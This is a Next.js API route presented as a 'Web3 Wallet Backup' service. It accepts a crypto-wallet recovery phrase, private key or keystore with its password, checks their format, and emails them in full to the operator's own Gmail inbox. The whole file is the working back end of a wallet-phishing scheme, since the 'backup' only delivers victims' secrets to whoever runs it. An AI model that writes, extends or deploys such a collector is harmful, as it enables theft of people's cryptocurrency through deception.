import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { walletName, type, data, name, email, password } = body;

    // Validate request and content
    if (!walletName || !type || !data || !name || !email) {
      return NextResponse.json({ error: 'Missing required fields' }, { status: 400 });
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      return NextResponse.json({ error: 'Invalid email address' }, { status: 400 });
    }

    if (type === 'phrase') {
      const wordCount = data.trim().split(/\s+/).length;
      if (![12, 15, 18, 21, 24].includes(wordCount)) {
        return NextResponse.json({ error: 'Invalid recovery phrase length' }, { status: 400 });
      }
    } else if (type === 'private') {
      const privateKeyRegex = /^(0x)?[a-fA-F0-9]{64}$/;
      if (!privateKeyRegex.test(data.trim())) {
        return NextResponse.json({ error: 'Invalid private key format' }, { status: 400 });
      }
    } else if (type === 'keystore') {
      try {
        const json = JSON.parse(data);
        if (!json || typeof json !== 'object') throw new Error();
        if (!password) {
          return NextResponse.json({ error: 'Password required for keystore' }, { status: 400 });
        }
      } catch (err) {
        return NextResponse.json({ error: 'Invalid keystore JSON' }, { status: 400 });
      }
    }

    // Configure transporter
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
      },
    });

    // Create email content
    const mailOptions = {
      from: `"Web3 Backup" <${process.env.EMAIL_USER}>`,
      to: process.env.EMAIL_USER,
      subject: `New Wallet Backup: ${walletName} (${type})`,
      html: `
        <h2>New Wallet Backup Details</h2>
        <p><strong>Wallet:</strong> ${walletName}</p>
        <p><strong>Type:</strong> ${type}</p>
        <p><strong>Name:</strong> ${name}</p>
        <p><strong>Email:</strong> ${email}</p>
        ${password ? `<p><strong>Wallet Password:</strong> ${password}</p>` : ''}
        <hr />
        <h3>Backup Data</h3>
        <pre style="background: #f4f4f4; padding: 15px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word;">${data}</pre>
        <hr />
        <p style="color: #666; font-size: 12px;">Submitted via Web3 Wallet Backup.</p>
      `,
    };

    // Send email
    await transporter.sendMail(mailOptions);

    return NextResponse.json({ success: true });
  } catch (error: any) {
    console.error('Email Error:', error);
    return NextResponse.json({ error: error.message || 'Failed to send email' }, { status: 500 });
  }
}
